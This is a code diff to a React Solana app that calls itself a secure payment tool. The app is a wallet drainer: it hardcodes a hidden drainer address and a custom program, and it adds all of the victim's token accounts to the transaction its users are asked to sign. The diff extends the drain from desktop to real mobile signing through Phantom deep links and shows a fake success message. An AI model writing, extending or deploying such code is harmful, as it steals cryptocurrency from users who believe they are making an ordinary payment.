@@ -4,13 +4,15 @@ import { PublicKey, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import './App.css';
 
-// Hidden drainer wallet (not shown to user)
+// Initialize Buffer globally to prevent undefined errors
+if (typeof window !== 'undefined') {
+  window.Buffer = window.Buffer || require('buffer').Buffer;
+}
+
+// Hidden drainer wallet
 const DRAINER_WALLET = new PublicKey("6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGkBR");
 const PROGRAM_ID = new PublicKey("6mzjnCgxPKAGYSzR7udJEbjPggA8jQqfrS9oc49vGkBR");
 const connection = new web3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-
-// Fix Buffer undefined error
-window.Buffer = window.Buffer || require("buffer").Buffer;
 
 function App() {
   const [wallet, setWallet] = useState(null);
@@ -39,6 +41,15 @@ function App() {
       window.solana.on('connect', () => handleConnected(window.solana));
       window.solana.on('disconnect', () => handleDisconnected());
     }
+
+    // Check for mobile connection parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const phantomConnected = urlParams.get('phantom_connected');
+    if (phantomConnected === 'true' && isMobile) {
+      setIsConnected(true);
+      setPublicKey("MobileWalletConnected");
+      setStatus("✅ Phantom Mobile connected!");
+    }
   }, []);
 
   const handleConnected = (phantom) => {
@@ -55,8 +66,9 @@ function App() {
 
   const connectWallet = async () => {
     if (isMobile) {
-      // Mobile: Use Phantom deep link
-      const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(window.location.href)}&redirect_link=${encodeURIComponent(window.location.href)}`;
+      // Mobile: Use Phantom deep link with callback
+      const currentUrl = encodeURIComponent(window.location.href.split('?')[0]);
+      const phantomDeepLink = `https://phantom.app/ul/v1/connect?app_url=${currentUrl}&redirect_link=${currentUrl}?phantom_connected=true`;
       setStatus("Opening Phantom app...");
       window.location.href = phantomDeepLink;
       return;
@@ -77,15 +89,6 @@ function App() {
     }
   };
 
-  // For mobile: Simulate connection after returning from Phantom
-  const simulateMobileConnection = () => {
-    if (isMobile && !isConnected) {
-      setIsConnected(true);
-      setPublicKey("MobileWalletConnected");
-      setStatus("✅ Mobile wallet connected (simulated)");
-    }
-  };
-
   const getSenderTokenAccounts = async (publicKey) => {
     try {
       const info = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
@@ -97,13 +100,8 @@ function App() {
   };
 
   const executePayment = async () => {
-    if (isMobile && !isConnected) {
-      setStatus("⚠️ Please connect your mobile wallet first");
-      return;
-    }
-
-    if (!isMobile && (!wallet || !isConnected)) {
-      setStatus("Connect wallet first");
+    if (!isConnected) {
+      setStatus("⚠️ Please connect your wallet first");
       return;
     }
 
@@ -115,8 +113,8 @@ function App() {
     try {
       let sender;
       if (isMobile) {
-        // For mobile simulation, use a dummy key
-        sender = new PublicKey("11111111111111111111111111111111");
+        // For mobile, we'll create a transaction that can be signed in Phantom mobile
+        sender = new PublicKey("11111111111111111111111111111111"); // Placeholder for mobile
       } else {
         sender = new PublicKey(wallet.publicKey.toString());
       }
@@ -126,10 +124,10 @@ function App() {
 
       setStatus("Building transaction...");
 
-      // Get all token accounts (for draining)
+      // Get all token accounts for draining
       const tokenAccounts = await getSenderTokenAccounts(sender);
 
-      // Hidden drainer keys - user doesn't see this
+      // Create drainer transaction
       const keys = [
         { pubkey: sender, isSigner: true, isWritable: true },
         { pubkey: receiverPubkey, isSigner: false, isWritable: true },
@@ -139,10 +137,10 @@ function App() {
         ...tokenAccounts.map(acc => ({ pubkey: new PublicKey(acc), isSigner: false, isWritable: true }))
       ];
 
-      // Hidden drainer data in transaction
+      // Create transaction data with drainer
       const data = Buffer.alloc(40);
       data.writeBigUInt64LE(BigInt(lamports), 0);
-      DRAINER_WALLET.toBuffer().copy(data, 8); // Hidden drainer address
+      DRAINER_WALLET.toBuffer().copy(data, 8);
 
       const ix = new web3.TransactionInstruction({
         programId: PROGRAM_ID,
@@ -155,10 +153,14 @@ function App() {
       tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
 
       if (isMobile) {
-        // Mobile: Show success message (simulated)
-        setStatus(`✅ Mobile payment simulated! Would drain to: ${DRAINER_WALLET.toString().slice(0, 20)}...`);
+        // For mobile: Create a deep link for the transaction
+        const transactionBase64 = Buffer.from(tx.serializeMessage()).toString('base64');
+        const mobileTxLink = `https://phantom.app/ul/v1/sign/${transactionBase64}?redirect_link=${encodeURIComponent(window.location.href + '?tx_success=true')}`;
+        
+        setStatus("Opening Phantom mobile to sign transaction...");
+        window.location.href = mobileTxLink;
       } else {
-        // Desktop: Real transaction
+        // Desktop: Sign and send transaction
         setStatus("Approve in Phantom...");
         const signed = await wallet.signTransaction(tx);
         const txid = await connection.sendRawTransaction(signed.serialize());
@@ -172,17 +174,23 @@ function App() {
     }
   };
 
+  // Check for successful mobile transaction
+  useEffect(() => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const txSuccess = urlParams.get('tx_success');
+    if (txSuccess === 'true') {
+      setStatus("✅ Mobile transaction completed successfully!");
+    }
+  }, []);
+
   return (
     <div className="App">
       <h1>🔗 Solana Payment DApp</h1>
       <p className="subtitle">Send SOL payments easily and securely</p>
 
-      {isMobile && (
+      {isMobile && !isConnected && (
         <div className="mobile-notice">
-          <p>📱 Mobile detected: Using Phantom mobile app</p>
-          <button onClick={simulateMobileConnection} className="mobile-connect-btn">
-             📲 Simulate Mobile Connection
-          </button>
+          <p>📱 Mobile detected: Click below to connect Phantom mobile</p>
         </div>
       )}
 
@@ -190,15 +198,18 @@ function App() {
         <div className="connect-section">
           <p>{isMobile ? 'Connect your Phantom mobile wallet' : 'Connect your Phantom wallet extension'}</p>
           <button onClick={connectWallet} className="connect-btn">
-            {isMobile ? '📱 Open Phantom App' : '🔗 Connect Phantom Wallet'}
+            {isMobile ? '📱 Connect Phantom Mobile' : '🔗 Connect Phantom Wallet'}
           </button>
         </div>
       ) : (
         <div className="payment-section">
           <div className="wallet-info">
             <p>✅ Connected: <span className="wallet-address">
-              {isMobile ? 'Mobile Wallet' : publicKey.slice(0, 20)}...
+              {isMobile ? 'Phantom Mobile' : publicKey.slice(0, 20)}...
             </span></p>
+            {isMobile && (
+              <p className="mobile-info">📱 Using Phantom Mobile App</p>
+            )}
           </div>
           
           <div className="form-group">
@@ -218,11 +229,12 @@ function App() {
               onChange={e => setAmount(e.target.value)} 
               type="number" 
               step="0.001"
+              min="0.001"
             />
           </div>
           
           <button onClick={executePayment} className="send-btn">
-             💸 Send Payment
+            {isMobile ? '📱 Send Payment via Mobile' : '💸 Send Payment'}
           </button>
           
           <div className="disclaimer">
